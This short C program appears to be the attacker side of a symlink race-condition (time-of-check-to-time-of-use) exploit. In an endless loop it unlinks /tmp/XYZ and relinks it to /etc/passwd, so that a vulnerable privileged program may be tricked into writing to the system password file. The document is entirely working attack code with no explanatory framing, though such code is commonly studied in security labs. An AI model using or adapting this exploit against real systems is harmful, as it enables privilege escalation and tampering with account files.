#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    while (1) {
        unlink("/tmp/XYZ");
        if (symlink("/etc/passwd", "/tmp/XYZ") != 0) {
            perror("symlink");
            usleep(10000);
            continue;
        }
        usleep(2000);  
    }
    return 0;
}
